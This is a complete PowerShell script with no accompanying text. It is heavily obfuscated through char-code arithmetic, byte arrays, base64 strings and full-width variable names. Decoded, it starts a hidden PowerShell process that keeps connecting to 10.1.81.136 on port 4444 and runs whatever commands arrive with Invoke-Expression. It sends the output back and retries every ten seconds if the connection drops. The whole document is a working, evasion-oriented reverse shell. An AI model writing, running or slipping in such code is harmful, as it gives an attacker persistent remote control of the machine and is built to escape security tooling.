$ｖ1 = [char](83)+[char](116)+[char](97)+[char](114)+[char](116)+[char](45)+[char](80)+[char](114)+[char](111)+[char](99)+[char](101)+[char](115)+[char](115)
$ｖ2 = [System.Text.Encoding]::ASCII.GetString(@(78,101,119,45,79,98,106,101,99,116))
$ｖ3 = [string]::Join('',@('N','e','t','.','S','o','c','k','e','t','s','.','T','C','P','C','l','i','e','n','t'))
$ｖ4 = [regex]::Replace('IOStreamWriter','(Stream)','.$1')
$ｖ5 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('byte[]')) -replace '.{4}$'
$ｖ6 = [string][char]82+[char]101+[char]99+[char]101+[char]105+[char]118+[char]101+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114+[char]83+[char]105+[char]122+[char]101

& ([scriptblock]::Create($ｖ1)) $PSHOME\powershell.exe -ArgumentList ([scriptblock]::Create(
@"
  `$`{`} = @(); `$`{`} += '10.1.81.136'; `$`{`} += 4444;
  while (`$`(```````$true```````)) {
    try {
      `$`_`_`_`_1 = & (`$executioncontext.InvokeCommand.NewScriptBlock(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TgBlAHcALQBPAGIAagBlAGMAdAA='))))) (`$([char]78+[char]101+[char]116+[char]46+[char]83+[char]111+[char]99+[char]107+[char]101+[char]116+[char]115+[char]46+[char]84+[char]67+[char]80+[char]67+[char]108+[char]105+[char]101+[char]110+[char]116)) (`$`{`}[0], `$`{`}[1]);
      `$`_`_`_`_2 = `$`_`_`_`_1.(([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::StringToHGlobalAuto('R2V0U3RyZWFt'))))();
      `$`_`_`_`_3 = & ([scriptblock]::Create([System.Text.Encoding]::ASCII.GetString(@(78,101,119,45,79,98,106,101,99,116)))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIA'))) (`$`_`_`_`_2);
      [byte[]]`$`_`_`_`_4 = 0..`$`_`_`_`_1.(([char]82+[char]101+[char]99+[char]101+[char]105+[char]118+[char]101+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114+[char]83+[char]105+[char]122+[char]101)) | % {0};

      function `$`_`_`_`_5 (`$`_`_`_`_6) {
        `$`_`_`_`_3.(([System.Runtime.InteropServices.Marshal]::PtrToStringAnsi([System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi('V3JpdGU='))))(`$`_`_`_`_6);
        `$`_`_`_`_3.(([char]70+[char]108+[char]117+[char]115+[char]104))();
      }

      `$`_`_`_`_5 (([string]::Empty));

      while ((`$`_`_`_`_7 = `$`_`_`_`_2.(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVhZA=='))))(`$`_`_`_`_4, 0, `$`_`_`_`_4.Length)) -gt 0) {
        `$`_`_`_`_8 = (([type](([char]116+[char]101+[char]120+[char]116+[char]46+[char]101+[char]110+[char]99+[char]111+[char]100+[char]105+[char]110+[char]103))]::UTF8)).(([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::StringToHGlobalAuto('R2V0U3RyaW5n'))))(`$`_`_`_`_4, 0, `$`_`_`_`_7 - 1);
        `$`_`_`_`_9 = try {
          & (`$executioncontext.InvokeCommand.NewScriptBlock([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24=')))) `$`_`_`_`_8 2>&1 | & ([scriptblock]::Create([System.Text.Encoding]::ASCII.GetString(@(79,117,116,45,83,116,114,105,110,103))));
        } catch {
          `$_ | & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T3V0LVN0cmluZw=='))));
        }
        `$`_`_`_`_5 (`$`_`_`_`_9);
      }

      `$`_`_`_`_3.(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q2xvc2U='))))();
      `$`_`_`_`_1.(([char]67+[char]108+[char]111+[char]115+[char]101))();
    }
    catch {
      & ([scriptblock]::Create([System.Text.Encoding]::ASCII.GetString(@(83,116,97,114,116,45,83,108,101,101,112)))) -([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2Vjb25kcw=='))) 10;
    }
  }
"@
)) -WindowStyle Hidden
